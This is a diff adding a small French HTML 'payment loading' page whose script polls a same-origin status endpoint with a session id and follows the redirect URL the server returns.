@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Chargement paiement</title></head>
+<body>
+<h1>⏳ Paiement en cours...</h1>
+<script>
+async function checkRedirect(){
+  const sessionId = new URLSearchParams(window.location.search).get('sid');
+  const res = await fetch('/api/status?sessionId='+sessionId);
+  const data = await res.json();
+  if(data.redirect) window.location.href = data.redirect;
+  else setTimeout(checkRedirect,2000);
+}
+checkRedirect();
+</script>
+</body>
+</html>
